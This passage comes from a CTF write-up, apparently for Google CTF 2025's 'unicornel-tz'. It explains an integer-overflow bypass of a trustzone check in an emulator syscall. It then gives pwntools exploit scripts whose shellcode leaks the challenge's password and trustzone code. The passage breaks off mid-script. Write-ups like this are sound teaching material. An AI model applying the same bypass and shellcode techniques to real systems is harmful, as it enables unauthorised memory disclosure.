</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nf">overlaps_tz</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">n</span><span class="p">))</span> <span class="n">TRUSTED_SYSCALL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">uc_mem_read</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">uc</span><span class="p">,</span><span class="n">src</span><span class="p">,</span><span class="n">dst</span><span class="p">,</span><span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="nf">unicornel_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">current</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pointer</span> <span class="o">=</span> <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">length</span> <span class="o">=</span>  <span class="nf">ARG_REGR</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span><span class="o">*</span> <span class="n">buffer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">buffer</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">uc_err</span> <span class="n">err</span> <span class="o">=</span> <span class="nf">safe_read</span><span class="p">(</span><span class="n">current</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">pointer</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">write</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">outfd</span><span class="p">,</span><span class="n">buffer</span><span class="p">,</span><span class="n">length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This syscall is responsible for writing data from the emulated process&rsquo;s memory to the output file descriptor. I observed that:</p>
<ul>
<li>Before reading memory, it calls <code>overlaps_tz()</code> to check if the requested memory region overlaps with the trustzone</li>
<li>The check uses the formula: <code>!(src + n &lt;= trustzone || trustzone + PAGE_ALIGN(tz_size) &lt;= src)</code></li>
<li>This means that it will require trustzone privileges if the memory region intersects with trustzone memory</li>
<li>Next, if the area is safe from any overlap, it will read the area with <code>uc_mem_read</code> and then print its contents</li>
</ul>
<p>However, there are two bugs in how <code>unicornel_write</code> checks for trustzone access.</p>
<ul>
<li>First, the calculation <code>src + n</code> can overflow, allowing us to bypass the trustzone check through integer overflow. For example, if <code>src</code> is set to <code>0xFFFFFFFFFFFFF000</code> and <code>n</code> is <code>0x1000</code>, then <code>src + n</code> will wrap around to zero (<code>0</code>). This makes the check think the region is before the trustzone and allows reading trustzone memory without proper privileges.</li>
<li>Second, <code>unicornel_write</code> uses <code>safe_read</code> which calls <code>uc_mem_read</code> to fetch the data to be printed. Using <code>uc_mem_read</code> to read data from the trustzone area will never trigger the set hook, because hooks are only triggered by read operations from emulated environment instructions, not from host <code>uc_mem_read</code> calls.</li>
</ul>
<p>With this bug, we can see that if we map any <code>trustzone</code> at the address <code>0xFFFFFFFFFFFFF000</code>, we can basically print its content through the <code>unicornel_write</code> syscall, because <code>overlaps_tz</code> is bypassed, and the hook is not triggered because it reads the data with <code>uc_mem_read</code>.</p>
<p>With these bugs are being discovered, we can now start thinking about how to exploit the app.</p>
<h3 id="solution">Solution</h3>
<p>To recap, the bug allows us to use <code>unicornel_write</code> to leak <code>trustzone</code> contents by mapping the <code>trustzone</code> at address <code>0xFFFFFFFFFFFFF000</code>. Let&rsquo;s start by creating a wrapper script that we can use to interact with and send our program to the application. This will help us leak some useful values.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unicorn</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span>        <span class="o">=</span> <span class="s1">&#39;./chal&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s1">&#39;unicornel-tz.2025.ctfcompetition.com&#39;</span><span class="p">,</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;run the solver with:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; solve &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_chall</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_chall</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_sol</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;python3 kctf-pow.py solve </span><span class="si">{</span><span class="n">pow_chall</span><span class="si">}</span><span class="s1"> 2&gt;/dev/null&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_sol</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Solution? &#39;</span><span class="p">,</span> <span class="n">pow_sol</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Welcome&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">CODE</span> <span class="o">=</span> <span class="n">shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">VA</span><span class="p">,</span> <span class="n">SIZE</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl"><span class="n">hdr</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_ARCH_X86</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p32</span><span class="p">(</span><span class="n">unicorn</span><span class="o">.</span><span class="n">UC_MODE_64</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">p64</span><span class="p">(</span><span class="n">VA</span><span class="p">),</span> <span class="n">p64</span><span class="p">(</span><span class="n">SIZE</span><span class="p">),</span>          <span class="c1"># one RX page for code+data</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">*</span> <span class="mi">16</span><span class="p">,</span>              <span class="c1"># unused maps</span>
</span></span><span class="line"><span class="cl">    <span class="n">p16</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">CODE</span><span class="p">)),</span>              <span class="c1"># code_length</span>
</span></span><span class="line"><span class="cl">    <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>                        <span class="c1"># num_maps</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\0</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;DATA_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">hdr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;CODE_START&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">CODE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>With the above script, we can easily fill in the <code>shellcode</code> of our emulated program that will be sent by the script to the app.</p>
<h4 id="leak-password-and-trustzones">Leak Password and Trustzones</h4>
<p>Remember that we can actually load <code>password</code> into the <code>trustzone</code> area. This means, combined with the <code>unicornel_write</code> bug, we can leak the <code>password</code> value! This will allow us to enable usage of the trustzone named <code>memprot_x86_64</code> provided by the app later on. Furthermore, we can actually leak the 3 available trustzones provided by the app, so that we can start debugging the app locally (remember that the challenge files didn&rsquo;t provide us the trustzone code, so we couldn&rsquo;t really debug it locally before this).  Here&rsquo;s what we need to write in our emulated program:</p>
<ul>
<li>Call the <code>create_trustzone</code> syscall by providing the filename we want to leak and setting <code>0xFFFFFFFFFFFFF000</code> as the mapped address</li>
<li>Call the <code>unicornel_write</code> syscall to leak it</li>
<li>Call the <code>destroy_trustzone</code> syscall if we want to leak another file (since the app only allows one <code>trustzone</code> per process)</li>
</ul>
<p>So, let&rsquo;s update our shellcode to leak the password and all the available trustzones. Below is the full script that I used to leak the values.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unicorn</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">exe</span>        <span class="o">=</span> <span class="s1">&#39;./chal&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span> <span class="o">=</span> <span class="s1">&#39;unicornel-tz.2025.ctfcompetition.com&#39;</span><span class="p">,</span> <span class="mi">1337</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">process</span><span class="p">(</span><span class="n">exe</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">devnull</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="sa">r</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">.intel_syntax noprefix
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;password&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r12, 0xFFFFFFFFFFFFF000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + password]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call unicornel_write to leak password */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x10
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 1
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">                
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call destroy_trustzone */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x9
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;create_map_shared_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r12, 0xFFFFFFFFFFFFF000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + create_map_shared_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call unicornel_write to leak create_map_shared_x86_64 */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x100
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 1
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">                
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call destroy_trustzone */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x9
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;map_shared_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r12, 0xFFFFFFFFFFFFF000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + map_shared_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call unicornel_write to leak map_shared_x86_64 */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x100
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 1
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">                
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call destroy_trustzone */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x9
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call create_trustzone &#39;memprot_x86_64&#39; */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov r12, 0xFFFFFFFFFFFFF000
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">lea rcx, [rip + memprot_x86_64]
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 8
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call unicornel_write to leak memprot_x86_64 */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rbx, r12
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rcx, 0x100
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 1
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">                
</span></span></span><span class="line"><span class="cl"><span class="s1">/* Call destroy_trustzone */
</span></span></span><span class="line"><span class="cl"><span class="s1">mov rax, 0x9
</span></span></span><span class="line"><span class="cl"><span class="s1">int 0x80
</span></span></span><span class="line"><span class="cl"><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">password:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;password\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">create_map_shared_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;create_map_shared_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">map_shared_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;map_shared_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">memprot_x86_64:
</span></span></span><span class="line"><span class="cl"><span class="s1">    .ascii &#34;memprot_x86_64\0&#34;
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mh">0x1000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;run the solver with:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39; solve &#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_chall</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_chall</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">pow_sol</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;python3 kctf-pow.py solve </span><span class="si">{</span><span class="n">pow_chall</span><span class="si">}</span><span class="s1"> 2&gt;/dev/null&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">pow_sol</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;Solution? &#39;</span><span class="p">,</span> <span class="n">pow_sol</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
